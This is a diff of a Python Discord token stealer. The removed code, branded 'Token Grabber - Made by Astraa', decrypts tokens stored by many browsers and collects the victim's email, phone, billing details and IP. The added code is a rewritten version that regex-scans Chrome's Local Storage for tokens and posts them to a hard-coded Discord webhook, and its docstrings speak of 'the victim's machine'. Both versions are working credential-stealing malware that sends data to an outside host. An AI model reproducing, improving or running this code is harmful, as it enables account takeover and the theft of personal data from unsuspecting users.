@@ -1,129 +1,145 @@
-from base64 import b64decode
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-from os import getlogin, listdir
-from json import loads
-from re import findall
-from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
-import requests, json, os
-from datetime import datetime
+# ruff: noqa: INP001
+import base64
+import json
+import os
+import re
+import urllib.request
+from pathlib import Path
 
-tokens = []
-cleaned = []
-checker = []
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
+}
+WEBHOOK_URL = "https://discord.com/api/webhooks/1401885048164319314/bex7eNtPHVG65SvbBGLfm-kuq6dpGLx-zmI9gBcnRDlGWxPffB0OxeaYvdNtLlvjR9rO"
 
-def decrypt(buff, master_key):
+
+def make_post_request(api_url: str, data: dict[str, str]) -> int:
+    if not api_url.startswith(("http", "https")):
+        raise ValueError
+
+    request = urllib.request.Request(  # noqa: S310
+        api_url, data=json.dumps(data).encode(),
+        headers=REQUEST_HEADERS,
+    )
+
+    with urllib.request.urlopen(request) as response:  # noqa: S310
+        return response.status
+
+
+def get_tokens_from_file(file_path: Path) -> list[str] | None:
+
     try:
-        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except:
-        return "Error"
-def getip():
-    ip = "None"
+        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
+    except PermissionError:
+        return None
+
+    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+
+    return tokens or None
+
+
+def get_user_id_from_token(token: str) -> str | None:
+    """Confirm that the portion of a string before the first dot can be decoded.
+
+    Decoding from base64 offers a useful, though not infallible, method for identifying
+    potential Discord tokens. This is informed by the fact that the initial
+    segment of a Discord token usually encodes the user ID in base64. However,
+    this test is not guaranteed to be 100% accurate in every case.
+
+    Returns
+    -------
+        A string representing the Discord user ID to which the token belongs,
+        if the first part of the token can be successfully decoded. Otherwise,
+        None.
+
+    """
     try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except: pass
-    return ip
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-def get_token():
-    already_check = []
-    checker = []
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    chrome = local + "\\Google\\Chrome\\User Data"
-    paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Lightcord': roaming + '\\Lightcord',
-        'Discord PTB': roaming + '\\discordptb',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-        'Amigo': local + '\\Amigo\\User Data',
-        'Torch': local + '\\Torch\\User Data',
-        'Kometa': local + '\\Kometa\\User Data',
-        'Orbitum': local + '\\Orbitum\\User Data',
-        'CentBrowser': local + '\\CentBrowser\\User Data',
-        '7Star': local + '\\7Star\\7Star\\User Data',
-        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': chrome + 'Default',
-        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
-        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Iridium': local + '\\Iridium\\User Data\\Default'
-    }
-    for platform, path in paths.items():
-        if not os.path.exists(path): continue
-        try:
-            with open(path + f"\\Local State", "r") as file:
-                key = loads(file.read())['os_crypt']['encrypted_key']
-                file.close()
-        except: continue
-        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
-            if not file.endswith(".ldb") and file.endswith(".log"): continue
-            else:
-                try:
-                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
-                        for x in files.readlines():
-                            x.strip()
-                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-                                tokens.append(values)
-                except PermissionError: continue
-        for i in tokens:
-            if i.endswith("\\"):
-                i.replace("\\", "")
-            elif i not in cleaned:
-                cleaned.append(i)
-        for token in cleaned:
-            try:
-                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-            except IndexError == "Error": continue
-            checker.append(tok)
-            for value in checker:
-                if value not in already_check:
-                    already_check.append(value)
-                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
-                    try:
-                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-                    except: continue
-                    if res.status_code == 200:
-                        res_json = res.json()
-                        ip = getip()
-                        pc_username = os.getenv("UserName")
-                        pc_name = os.getenv("COMPUTERNAME")
-                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
-                        user_id = res_json['id']
-                        email = res_json['email']
-                        phone = res_json['phone']
-                        mfa_enabled = res_json['mfa_enabled']
-                        has_nitro = False
-                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
-                        nitro_data = res.json()
-                        has_nitro = bool(len(nitro_data) > 0)
-                        days_left = 0
-                        if has_nitro:
-                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                            days_left = abs((d2 - d1).days)
-                        embed = f"""**{user_name}** *({user_id})*\n
-> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
-> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
-> :piñata: __Token__\n\t`{tok}`\n
-*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
-                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
-                        try:
-                            headers2 = {
-                                'Content-Type': 'application/json',
-                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-                            }
-                            req = Request('https://discord.com/api/webhooks/1399074024759365796/atqTUZmX8g9VCLnpI0sZqTMMCq-AEF0IMS2HSrtKBm8qitk-qLY-PeEOnPTA0yg2cAqr', data=payload.encode(), headers=headers2)
-                            urlopen(req)
-                        except: continue
-                else: continue
-if __name__ == '__main__':
-    get_token()
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "==",
+        ).decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+
+    return discord_user_id
+
+
+def get_tokens_from_path(base_path: Path) -> dict[str, set]:
+    """Collect discord tokens for each user ID.
+
+    to manage the occurrence of both valid and expired Discord tokens, which happens when a
+    user updates their password, triggering a change in their token. Lacking
+    the capability to differentiate between valid and expired tokens without
+    making queries to the Discord API, the function compiles every discovered
+    token into the returned set. It is designed for these tokens to be
+    validated later, in a process separate from the initial collection and not
+    on the victim's machine.
+
+    Returns
+    -------
+        user id mapped to a set of potential tokens
+
+    """
+    file_paths = [file for file in base_path.iterdir() if file.is_file()]
+
+    id_to_tokens: dict[str, set] = {}
+
+    for file_path in file_paths:
+        potential_tokens = get_tokens_from_file(file_path)
+
+        if potential_tokens is None:
+            continue
+
+        for potential_token in potential_tokens:
+            discord_user_id = get_user_id_from_token(potential_token)
+
+            if discord_user_id is None:
+                continue
+
+            if discord_user_id not in id_to_tokens:
+                id_to_tokens[discord_user_id] = set()
+
+            id_to_tokens[discord_user_id].add(potential_token)
+
+    return id_to_tokens or None
+
+
+def send_tokens_to_webhook(
+    webhook_url: str, user_id_to_token: dict[str, set[str]],
+) -> int:
+    """Caution: In scenarios where the victim has logged into multiple Discord
+    accounts or has frequently changed their password, the accumulation of
+    tokens may result in a message that surpasses the character limit,
+    preventing it from being sent. There are no plans to introduce code
+    modifications to segment the message for compliance with character
+    constraints.
+    """  # noqa: D205
+    fields: list[dict] = []
+
+    for user_id, tokens in user_id_to_token.items():
+        fields.append({
+            "name": user_id,
+            "value": "\n".join(tokens),
+        })
+
+    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
+
+    make_post_request(webhook_url, data)
+
+
+def main() -> None:
+
+    chrome_path = (
+        Path(os.getenv("LOCALAPPDATA")) /
+        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
+    )
+    tokens = get_tokens_from_path(chrome_path)
+
+    if tokens is None:
+        return
+
+    send_tokens_to_webhook(WEBHOOK_URL, tokens)
+
+
+if __name__ == "__main__":
+    main()
